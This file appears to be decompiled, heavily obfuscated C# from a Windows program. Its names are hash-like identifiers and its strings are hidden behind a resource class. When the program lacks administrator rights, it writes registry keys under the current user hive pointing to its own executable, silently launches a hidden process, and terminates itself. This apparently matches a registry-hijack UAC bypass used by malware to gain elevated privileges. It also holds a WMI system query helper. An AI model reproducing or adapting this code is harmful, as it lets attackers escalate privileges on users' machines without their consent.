using System;
using System.Diagnostics;
using System.Management;
using System.Reflection;
using System.Security.Principal;
using _003Cdion2ntty2ic0uyoe_003E_007B43570453_002D3AD8_002D4A5B_002DB273_002D83DF8156D820_007D;
using Microsoft.Win32;

namespace C3904355907;

public class C3372436214
{
	public static void C3554254475()
	{
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
		if (!windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
		{
			C3554254475(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JL());
			C3554254475(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Jl());
			C3554254475(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JM());
			C3554254475(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Jm());
			RegistryKey registryKey = C3554254475(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JN());
			string location = Assembly.GetExecutingAssembly().Location;
			registryKey.SetValue(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.cz(), location, RegistryValueKind.String);
			registryKey.SetValue(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iC(), 0, RegistryValueKind.DWord);
			registryKey.Close();
			try
			{
				Process.Start(new ProcessStartInfo
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					FileName = DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.id(),
					Arguments = DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Jn()
				});
			}
			catch
			{
			}
			Process.GetCurrentProcess().Kill();
		}
		else
		{
			RegistryKey registryKey2 = C3554254475(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JN());
			registryKey2.SetValue(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.cz(), DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.cz(), RegistryValueKind.String);
		}
	}

	public static RegistryKey C3554254475(string string_0)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JO() + string_0, writable: true);
		if (!C3554254475(registryKey))
		{
			registryKey = Registry.CurrentUser.CreateSubKey(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JO() + string_0);
		}
		return registryKey;
	}

	public static bool C3554254475(RegistryKey registryKey_0)
	{
		return registryKey_0 != null;
	}

	private static ManagementObject C3904355907(string string_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		ManagementClass val = new ManagementClass(string_0);
		try
		{
			ManagementObjectEnumerator enumerator = val.GetInstances().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementBaseObject current = enumerator.get_Current();
					ManagementObject val2 = (ManagementObject)current;
					if (val2 != null)
					{
						return val2;
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch
		{
		}
		return null;
	}

	public static string C3904355907()
	{
		try
		{
			ManagementObject val = C3904355907(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Jo());
			if (val == null)
			{
				return string.Empty;
			}
			return ((ManagementBaseObject)val).get_Item(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.cY()) as string;
		}
		catch (Exception)
		{
			return string.Empty;
		}
	}
}
